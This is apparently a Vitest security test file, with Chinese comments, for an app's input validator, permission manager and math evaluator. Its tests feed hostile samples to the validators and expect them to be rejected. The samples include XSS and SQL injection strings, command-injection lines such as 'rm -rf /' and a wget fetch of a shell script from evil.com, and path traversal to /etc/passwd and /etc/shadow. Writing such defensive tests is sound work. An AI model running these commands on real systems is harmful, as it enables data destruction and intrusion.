import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { InputValidator, validateAndSanitizeSearchQuery, validateFilePath, validatePluginId, validateMathExpression, validateUrl, sanitizeInput } from '@/lib/security/input-validator'
import { permissionManager } from '@/lib/security/permission-manager'
import { evaluateMathExpression, evaluateAdvancedMathExpression } from '@/lib/security/math-evaluator'

/**
 * 安全漏洞测试套件
 * 针对合并报告中识别的高优先级安全问题进行全面测试
 */

describe('安全漏洞测试套件', () => {
  let mockNavigator: any
  let mockConfirm: any

  beforeEach(() => {
    // 模拟浏览器环境
    mockNavigator = {
      permissions: {
        query: vi.fn()
      },
      clipboard: {
        writeText: vi.fn(),
        readText: vi.fn()
      }
    }
    
    mockConfirm = vi.fn()
    
    // 设置全局模拟
    Object.assign(global, {
      navigator: mockNavigator,
      confirm: mockConfirm
    })
    
    // 清理权限缓存
    permissionManager.clearPermissionCache()
    
    vi.clearAllMocks()
  })

  afterEach(() => {
    // 清理全局模拟
    delete (global as any).navigator
    delete (global as any).confirm
  })

  describe('输入验证和消毒测试', () => {
    it('应该阻止XSS攻击脚本注入', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '" onclick="alert(\'xss\')"'
      ]

      for (const payload of xssPayloads) {
        const result = InputValidator.validateSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止SQL注入尝试', () => {
      const sqlPayloads = [
        'SELECT * FROM users',
        'DROP TABLE users',
        '1; DROP TABLE users--',
        "' OR '1'='1",
        "admin'--",
        'UNION SELECT username, password FROM users'
      ]

      for (const payload of sqlPayloads) {
        const result = InputValidator.validateSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止命令注入尝试', () => {
      const commandPayloads = [
        'rm -rf /',
        'system("rm -rf /")',
        'exec("whoami")',
        '| ls -la',
        '; cat /etc/passwd',
        '&& wget http://evil.com/shell.sh'
      ]

      for (const payload of commandPayloads) {
        const result = InputValidator.validateSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止路径遍历攻击', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32\\config',
        'file:///etc/passwd',
        '....\\\\....\\\\....\\\\etc/passwd'
      ]

      for (const payload of pathTraversalPayloads) {
        const result = InputValidator.validateSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该正确处理超长输入', () => {
      const longInput = 'a'.repeat(1000)
      const result = InputValidator.validateSearchQuery(longInput)
      
      expect(result.warnings).toContain('搜索查询过长，可能会影响性能')
      expect(result.sanitized.length).toBe(500)
    })

    it('应该正确消毒特殊字符', () => {
      const inputWithSpecialChars = 'test\x00\x1F\u2028\u2029<script>'
      const result = InputValidator.validateSearchQuery(inputWithSpecialChars)
      
      expect(result.sanitized).not.toContain('\x00')
      expect(result.sanitized).not.toContain('\x1F')
      expect(result.sanitized).not.toContain('\u2028')
      expect(result.sanitized).not.toContain('\u2029')
    })

    it('应该拒绝空输入和只有空格的输入', () => {
      const emptyInputs = ['', '   ', '\t', '\n', ' \t\n ']
      
      for (const input of emptyInputs) {
        const result = InputValidator.validateSearchQuery(input)
        expect(result.isValid).toBe(false)
        expect(result.errors).toContain('搜索查询不能为空')
      }
    })
  })

  describe('文件路径安全验证测试', () => {
    it('应该验证文件路径安全性', () => {
      const safePaths = [
        '/home/user/documents',
        'C:\\Users\\User\\Documents',
        './relative/path',
        'normal_file.txt'
      ]

      const dangerousPaths = [
        '../../../etc/passwd',
        'C:\\Windows\\System32',
        '/etc/shadow',
        'file<>name.txt',
        'pipe|name.txt'
      ]

      for (const path of safePaths) {
        const result = InputValidator.validateFilePath(path)
        expect(result.isValid).toBe(true)
      }

      for (const path of dangerousPaths) {
        const result = InputValidator.validateFilePath(path)
        expect(result.warnings.length).toBeGreaterThan(0)
      }
    })

    it('应该拒绝超长文件路径', () => {
      const longPath = 'a'.repeat(5000)
      const result = InputValidator.validateFilePath(longPath)
      
      expect(result.isValid).toBe(false)
      expect(result.errors).toContain('文件路径过长')
    })

    it('应该识别网络路径', () => {
      const networkPath = '\\\\server\\share\\file.txt'
      const result = InputValidator.validateFilePath(networkPath)
      
      expect(result.warnings.some(warning => warning.includes('网络路径'))).toBe(true)
    })
  })

  describe('数学表达式安全验证测试', () => {
    it('应该阻止代码注入到数学表达式', () => {
      const maliciousExpressions = [
        'function(){alert("xss")}()',
        'eval("alert(1)")',
        'new Function("return alert(1)")()',
        'setTimeout(function(){alert(1)},0)',
        'document.cookie',
        'window.location="http://evil.com"'
      ]

      for (const expr of maliciousExpressions) {
        const result = InputValidator.validateMathExpression(expr)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险模式'))).toBe(true)
      }
    })

    it('应该允许安全的数学表达式', () => {
      const safeExpressions = [
        '2 + 2',
        'sin(π/2)',
        'log(100)',
        'sqrt(16)',
        '3.14 * 2',
        '2^10'
      ]

      for (const expr of safeExpressions) {
        const result = InputValidator.validateMathExpression(expr)
        expect(result.isValid).toBe(true)
      }
    })

    it('应该使用安全的数学表达式求值器', () => {
      // 测试基础表达式
      expect(evaluateMathExpression('2 + 2')).toBe(4)
      expect(evaluateMathExpression('3 * 4')).toBe(12)
      expect(evaluateMathExpression('sqrt(16)')).toBe(4)
      
      // 测试危险表达式返回null
      expect(evaluateMathExpression('eval("alert(1)")')).toBeNull()
      expect(evaluateMathExpression('function(){return 1}()')).toBeNull()
      expect(evaluateMathExpression('')).toBeNull()
    })

    it('应该处理除零错误', () => {
      expect(evaluateMathExpression('1 / 0')).toBeNull()
    })

    it('应该处理负数开平方', () => {
      expect(evaluateMathExpression('sqrt(-1)')).toBeNull()
    })
  })

  describe('URL安全验证测试', () => {
    it('应该验证URL安全性', () => {
      const safeUrls = [
        'https://example.com',
        'http://example.com',
        'mailto:user@example.com',
        'tel:+1234567890'
      ]

      const dangerousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        'ftp://evil.com/malware.exe',
        'file:///etc/passwd'
      ]

      for (const url of safeUrls) {
        const result = InputValidator.validateUrl(url)
        expect(result.isValid).toBe(true)
      }

      for (const url of dangerousUrls) {
        const result = InputValidator.validateUrl(url)
        expect(result.isValid).toBe(false)
      }
    })

    it('应该自动补充缺失的协议', () => {
      const urlWithoutProtocol = 'example.com'
      const result = InputValidator.validateUrl(urlWithoutProtocol)
      
      expect(result.isValid).toBe(true)
      expect(result.sanitized).toBe('https://example.com')
      expect(result.warnings.some(warning => warning.includes('缺少协议'))).toBe(true)
    })

    it('应该拒绝超长URL', () => {
      const longUrl = 'https://example.com/' + 'a'.repeat(3000)
      const result = InputValidator.validateUrl(longUrl)
      
      expect(result.warnings.some(warning => warning.includes('过长'))).toBe(true)
    })
  })

  describe('权限管理器安全测试', () => {
    it('应该正确处理剪贴板权限请求', async () => {
      // 模拟权限已授予
      mockNavigator.permissions.query.mockResolvedValue({ state: 'granted' })
      
      const result = await permissionManager.requestClipboardAccess('test-context')
      expect(result).toBe(true)
      
      // 验证权限被缓存
      const cachedResult = permissionManager.getPermissionStatus('clipboard', 'test-context')
      expect(cachedResult).toBe(true)
    })

    it('应该处理权限需要用户确认的情况', async () => {
      // 模拟需要用户确认
      mockNavigator.permissions.query.mockResolvedValue({ state: 'prompt' })
      mockConfirm.mockReturnValue(true)
      
      const result = await permissionManager.requestClipboardAccess('test-context')
      expect(result).toBe(true)
      expect(mockConfirm).toHaveBeenCalled()
    })

    it('应该处理权限被拒绝的情况', async () => {
      // 模拟权限被拒绝
      mockNavigator.permissions.query.mockResolvedValue({ state: 'denied' })
      mockConfirm.mockReturnValue(false)
      
      const result = await permissionManager.requestClipboardAccess('test-context')
      expect(result).toBe(false)
    })

    it('应该验证文件系统访问权限', () => {
      // 安全路径
      const safePaths = [
        '/home/user/documents',
        '/tmp/test.txt',
        'C:\\Users\\User\\Documents'
      ]

      // 危险路径
      const dangerousPaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        'C:\\Windows\\System32',
        'file<>name.txt'
      ]

      for (const path of safePaths) {
        expect(permissionManager.checkFileSystemAccess(path)).toBe(true)
      }

      for (const path of dangerousPaths) {
        expect(permissionManager.checkFileSystemAccess(path)).toBe(false)
      }
    })

    it('应该验证搜索路径安全性', () => {
      // 有效搜索路径
      const validPaths = [
        '/home/user',
        './relative/path',
        'C:\\Users\\User'
      ]

      // 无效搜索路径
      const invalidPaths = [
        '../../../etc',
        '',
        'invalid:path',
        'a'.repeat(5000)
      ]

      for (const path of validPaths) {
        expect(permissionManager.validateSearchPath(path)).toBe(true)
      }

      for (const path of invalidPaths) {
        expect(permissionManager.validateSearchPath(path)).toBe(false)
      }
    })

    it('应该阻止访问系统关键目录', () => {
      const systemPaths = [
        '/etc/passwd',
        '/usr/bin',
        '/bin/sh',
        'C:\\Windows\\System32\\config',
        'C:\\Program Files'
      ]

      for (const path of systemPaths) {
        expect(permissionManager.checkFileSystemAccess(path)).toBe(false)
      }
    })
  })

  describe('插件ID安全验证测试', () => {
    it('应该验证插件ID格式', () => {
      const validIds = [
        'my-plugin',
        'test_plugin',
        'myPlugin123',
        'app-search'
      ]

      const invalidIds = [
        '123plugin',        // 数字开头
        'my plugin',        // 包含空格
        'my@plugin',        // 包含特殊字符
        'my',              // 太短
        'a'.repeat(51),     // 太长
        'system',          // 保留字
        'admin'            // 保留字
      ]

      for (const id of validIds) {
        const result = InputValidator.validatePluginId(id)
        expect(result.isValid).toBe(true)
      }

      for (const id of invalidIds) {
        const result = InputValidator.validatePluginId(id)
        expect(result.isValid).toBe(false)
      }
    })

    it('应该警告使用保留字', () => {
      const reservedWords = ['system', 'admin', 'root', 'core', 'builtin']
      
      for (const word of reservedWords) {
        const result = InputValidator.validatePluginId(word)
        expect(result.warnings.some(warning => warning.includes('保留字'))).toBe(true)
      }
    })
  })

  describe('通用输入消毒测试', () => {
    it('应该正确消毒HTML内容', () => {
      const htmlInput = '<script>alert("xss")</script><div>Hello</div>'
      const sanitized = sanitizeInput(htmlInput)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).toContain('&lt;script&gt;')
      expect(sanitized).toContain('&lt;div&gt;')
    })

    it('应该正确消毒JavaScript协议', () => {
      const jsInput = 'javascript:alert("xss")'
      const sanitized = sanitizeInput(jsInput)
      
      expect(sanitized).toContain('javascript-disabled:')
    })

    it('应该移除控制字符', () => {
      const inputWithControlChars = 'test\x00\x01\x02\x1F'
      const sanitized = sanitizeInput(inputWithControlChars)
      
      expect(sanitized).toBe('test')
    })

    it('应该应用长度限制', () => {
      const longInput = 'a'.repeat(100)
      const sanitized = sanitizeInput(longInput, { maxLength: 50 })
      
      expect(sanitized.length).toBe(50)
    })

    it('应该提供配置选项', () => {
      const input = '<script>alert("test")</script>'
      
      // 允许HTML
      const allowHtml = sanitizeInput(input, { allowHtml: true })
      expect(allowHtml).toContain('<script>')
      
      // 不允许HTML
      const noHtml = sanitizeInput(input, { allowHtml: false })
      expect(noHtml).not.toContain('<script>')
    })
  })

  describe('高级数学表达式安全测试', () => {
    it('应该安全处理高级数学函数', () => {
      const advancedExpressions = [
        'sin(π/2)',
        'cos(0)',
        'log(100)',
        'ln(e)',
        'abs(-5)',
        'floor(3.7)',
        'ceil(3.2)',
        'round(3.5)'
      ]

      for (const expr of advancedExpressions) {
        const result = evaluateAdvancedMathExpression(expr)
        expect(result).not.toBeNull()
        expect(typeof result).toBe('number')
        expect(isFinite(result)).toBe(true)
      }
    })

    it('应该阻止在高级函数中的代码注入', () => {
      const maliciousExpressions = [
        'sin(eval("alert(1)"))',
        'cos(document.cookie)',
        'log(window.location)',
        'abs(function(){return 1}())'
      ]

      for (const expr of maliciousExpressions) {
        const result = evaluateAdvancedMathExpression(expr)
        expect(result).toBeNull()
      }
    })

    it('应该处理嵌套函数调用', () => {
      const nestedExpressions = [
        'sin(cos(0))',
        'log(abs(100))',
        'floor(round(3.7))'
      ]

      for (const expr of nestedExpressions) {
        const result = evaluateAdvancedMathExpression(expr)
        expect(result).not.toBeNull()
      }
    })

    it('应该处理精度设置', () => {
      const result = evaluateAdvancedMathExpression('2 / 3', 2)
      expect(result).toBeCloseTo(0.67, 2)
      
      const highPrecision = evaluateAdvancedMathExpression('2 / 3', 10)
      expect(highPrecision).toBeCloseTo(0.6666666667, 10)
    })
  })

  describe('错误处理和边界情况测试', () => {
    it('应该优雅处理权限API不可用的情况', async () => {
      // 模拟权限API不可用
      delete (global as any).navigator.permissions
      
      // 模拟剪贴板写入成功
      mockNavigator.clipboard.writeText.mockResolvedValue()
      
      const result = await permissionManager.requestClipboardAccess('test-context')
      expect(result).toBe(true)
    })

    it('应该处理剪贴板操作失败', async () => {
      // 模拟剪贴板写入失败
      mockNavigator.clipboard.writeText.mockRejectedValue(new Error('Clipboard access denied'))
      mockConfirm.mockReturnValue(false)
      
      const result = await permissionManager.requestClipboardAccess('test-context')
      expect(result).toBe(false)
    })

    it('应该处理无效的输入类型', () => {
      const invalidInputs = [
        null,
        undefined,
        123,
        {},
        [],
        () => {}
      ]

      for (const input of invalidInputs) {
        const result = InputValidator.validateSearchQuery(input as string)
        expect(result.isValid).toBe(false)
      }
    })

    it('应该处理权限缓存清理', () => {
      // 设置一些权限状态
      permissionManager.clearPermissionCache()
      
      // 验证缓存已清空
      const status = permissionManager.getPermissionStatus('test', 'context')
      expect(status).toBeNull()
    })
  })

  describe('性能和压力测试', () => {
    it('应该快速处理大量验证请求', () => {
      const testQueries = Array.from({ length: 100 }, (_, i) => `test query ${i}`)
      
      const startTime = performance.now()
      
      for (const query of testQueries) {
        InputValidator.validateSearchQuery(query)
      }
      
      const endTime = performance.now()
      const duration = endTime - startTime
      
      // 应该在100ms内完成100次验证
      expect(duration).toBeLessThan(100)
    })

    it('应该高效处理超长输入', () => {
      const veryLongInput = 'a'.repeat(10000)
      
      const startTime = performance.now()
      const result = InputValidator.validateSearchQuery(veryLongInput)
      const endTime = performance.now()
      
      expect(duration).toBeLessThan(10) // 应该在10ms内完成
      expect(result.sanitized.length).toBe(500) // 应该被截断
    })

    it('应该高效处理复杂权限检查', () => {
      const testPaths = Array.from({ length: 50 }, (_, i) => `/path/to/file${i}.txt`)
      
      const startTime = performance.now()
      
      for (const path of testPaths) {
        permissionManager.checkFileSystemAccess(path)
      }
      
      const endTime = performance.now()
      const duration = endTime - startTime
      
      expect(duration).toBeLessThan(50) // 应该在50ms内完成
    })
  })
})